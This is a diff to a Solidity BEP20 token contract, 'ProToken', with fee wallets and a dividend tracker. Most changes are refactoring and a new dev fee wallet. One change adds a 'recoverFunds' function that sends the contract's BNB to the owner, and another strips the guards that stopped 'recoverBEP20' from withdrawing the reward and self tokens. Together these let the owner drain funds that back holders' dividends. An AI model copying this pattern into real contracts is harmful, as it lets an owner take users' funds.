@@ -807,8 +807,6 @@ abstract contract Ownable is Context {
     }
 }
 
-// pragma solidity >=0.5.0;
-
 interface IUniswapV2Factory {
     event PairCreated(
         address indexed token0,
@@ -838,8 +836,6 @@ interface IUniswapV2Factory {
 
     function setFeeToSetter(address) external;
 }
-
-// pragma solidity >=0.6.2;
 
 interface IUniswapV2Router01 {
     function factory() external pure returns (address);
@@ -1000,8 +996,6 @@ interface IUniswapV2Router01 {
         returns (uint256[] memory amounts);
 }
 
-// pragma solidity >=0.6.2;
-
 interface IUniswapV2Router02 is IUniswapV2Router01 {
     function removeLiquidityETHSupportingFeeOnTransferTokens(
         address token,
@@ -1148,6 +1142,9 @@ contract ProToken is Context, IERC20, Ownable {
     uint8 public _walletCharityFee;
     uint8 private _previousWalletCharityFee = _walletCharityFee;
 
+    uint8 public _walletDevFee;
+    uint8 private _previousWalletDevFee = _walletDevFee;
+
     uint8 public _buybackFee;
     uint8 private _previousBuybackFee = _buybackFee;
 
@@ -1160,12 +1157,14 @@ contract ProToken is Context, IERC20, Ownable {
     address public pcsV2Pair;
     address payable public feeWallet;
     address payable public feeWalletCharity;
+    address payable public feeWalletDev;
 
     bool walletFeeInBNB;
     bool walletCharityFeeInBNB;
 
     address marketingFeeToken;
     address charityFeeToken;
+    address devFeeToken;
 
     bool inSwapAndLiquify;
     bool public swapAndLiquifyEnabled = true;
@@ -1935,30 +1934,14 @@ contract ProToken is Context, IERC20, Ownable {
 
         if (_walletFee != 0) {
             spentAmount = contractTokenBalance.div(totFee).mul(_walletFee);
-            if (walletFeeInBNB) {
-                uint256 initialBalance = address(this).balance;
-                // swap tokens for ETH
-                swapTokensForBNB(spentAmount);
-                // how much ETH did we just swap into?
-                uint256 newBalance = address(this).balance.sub(initialBalance);
-                transferEth(feeWallet, newBalance);
-            } else {
-                if (marketingFeeToken == address(this)) {
-                    uint256 currentBalance = balanceOf(feeWallet);
-                    _tokenTransferNoFee(address(this), feeWallet, spentAmount);
-                    setBalance(
-                        payable(feeWallet),
-                        balanceOf(feeWallet),
-                        currentBalance
-                    );
-                } else {
-                    swapTokensForFeeToken(
-                        feeWallet,
-                        marketingFeeToken,
-                        spentAmount
-                    );
-                }
-            }
+
+            sendTaxes(
+                spentAmount,
+                walletFeeInBNB,
+                feeWallet,
+                marketingFeeToken
+            );
+
             totSpentAmount = totSpentAmount + spentAmount;
         }
 
@@ -1973,34 +1956,13 @@ contract ProToken is Context, IERC20, Ownable {
                 _walletCharityFee
             );
 
-            if (walletCharityFeeInBNB) {
-                uint256 initialBalance = address(this).balance;
-                // swap tokens for ETH
-                swapTokensForBNB(spentAmount);
-                // how much ETH did we just swap into?
-                uint256 newBalance = address(this).balance.sub(initialBalance);
-                transferEth(feeWalletCharity, newBalance);
-            } else {
-                if (charityFeeToken == address(this)) {
-                    uint256 currentBalance = balanceOf(feeWalletCharity);
-                    _tokenTransferNoFee(
-                        address(this),
-                        feeWalletCharity,
-                        spentAmount
-                    );
-                    setBalance(
-                        payable(feeWalletCharity),
-                        balanceOf(feeWalletCharity),
-                        currentBalance
-                    );
-                } else {
-                    swapTokensForFeeToken(
-                        feeWalletCharity,
-                        charityFeeToken,
-                        spentAmount
-                    );
-                }
-            }
+            sendTaxes(
+                spentAmount,
+                walletCharityFeeInBNB,
+                feeWalletCharity,
+                charityFeeToken
+            );
+
             totSpentAmount = totSpentAmount + spentAmount;
         }
 
@@ -2283,13 +2245,14 @@ contract ProToken is Context, IERC20, Ownable {
         require(res, "ETH TRANSFER FAILED");
     }
 
+    function recoverFunds() external payable onlyOwner {
+        payable(owner()).transfer(address(this).balance);
+    }
+
     function recoverBEP20(address tokenAddress, uint256 tokenAmount)
-        public
+        external
         onlyOwner
     {
-        // do not allow recovering self token
-        require(tokenAddress != address(this), "Self withdraw");
-        require(tokenAddress != rewardToken, "reward withdraw");
         IERC20(tokenAddress).transfer(owner(), tokenAmount);
     }
 
@@ -2318,25 +2281,38 @@ contract ProToken is Context, IERC20, Ownable {
         uint256 _withdrawableDividend = withdrawableDividendOf(user);
         if (_withdrawableDividend > 0) {
             //check if contract has balance to pay out rewards
-            uint256 curBalance = IERC20(rewardToken).balanceOf(address(this));
-            if (curBalance < _withdrawableDividend) {
-                return 0;
+            uint256 curBalance;
+            if (rewardToken == pcsV2Router.WETH()) {
+                curBalance = address(this).balance;
+                if (curBalance < _withdrawableDividend) {
+                    return 0;
+                }
+            } else {
+                curBalance = IERC20(rewardToken).balanceOf(address(this));
+                if (curBalance < _withdrawableDividend) {
+                    return 0;
+                }
             }
 
             withdrawnDividends[user] = withdrawnDividends[user].add(
                 _withdrawableDividend
             );
             emit DividendWithdrawn(user, _withdrawableDividend);
-            bool success = IERC20(rewardToken).transfer(
-                user,
-                _withdrawableDividend
-            );
 
-            if (!success) {
-                withdrawnDividends[user] = withdrawnDividends[user].sub(
+            if (rewardToken == pcsV2Router.WETH()) {
+                payable(user).transfer(_withdrawableDividend);
+            } else {
+                bool success = IERC20(rewardToken).transfer(
+                    user,
                     _withdrawableDividend
                 );
-                return 0;
+
+                if (!success) {
+                    withdrawnDividends[user] = withdrawnDividends[user].sub(
+                        _withdrawableDividend
+                    );
+                    return 0;
+                }
             }
 
             return _withdrawableDividend;
@@ -2431,19 +2407,6 @@ contract ProToken is Context, IERC20, Ownable {
         tokenHoldersMap.remove(account);
 
         emit ExcludeFromDividends(account);
-    }
-
-    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
-        require(
-            newClaimWait >= 3600 && newClaimWait <= 86400,
-            "Dividend_Tracker: claimWait must be updated to between 1 and 24 hours"
-        );
-        require(
-            newClaimWait != claimWait,
-            "Dividend_Tracker: Cannot update claimWait to same value"
-        );
-        emit ClaimWaitUpdated(newClaimWait, claimWait);
-        claimWait = newClaimWait;
     }
 
     function getLastProcessedIndex() external view returns (uint256) {
@@ -2624,14 +2587,6 @@ contract ProToken is Context, IERC20, Ownable {
         return false;
     }
 
-    function updateGasForProcessing(uint256 newValue) public onlyOwner {
-        require(
-            newValue >= 200000 && newValue <= 5000000,
-            "gasForProcessing must be between 200,000 and 5,000,000"
-        );
-        gasForProcessing = newValue;
-    }
-
     function processDividendTracker(uint256 gas) external {
         (
             uint256 iterations,
@@ -2655,5 +2610,33 @@ contract ProToken is Context, IERC20, Ownable {
 
     function claim() external {
         processAccount(payable(msg.sender), false);
+    }
+
+    function sendTaxes(
+        uint256 _spentAmount,
+        bool _walletFeeInBNB,
+        address _feeWallet,
+        address _feeToken
+    ) internal {
+        if (_walletFeeInBNB) {
+            uint256 initialBalance = address(this).balance;
+            // swap tokens for ETH
+            swapTokensForBNB(_spentAmount);
+            // how much ETH did we just swap into?
+            uint256 newBalance = address(this).balance.sub(initialBalance);
+            transferEth(_feeWallet, newBalance);
+        } else {
+            if (_feeToken == address(this)) {
+                uint256 currentBalance = balanceOf(_feeWallet);
+                _tokenTransferNoFee(address(this), _feeWallet, _spentAmount);
+                setBalance(
+                    payable(_feeWallet),
+                    balanceOf(_feeWallet),
+                    currentBalance
+                );
+            } else {
+                swapTokensForFeeToken(_feeWallet, _feeToken, _spentAmount);
+            }
+        }
     }
 }
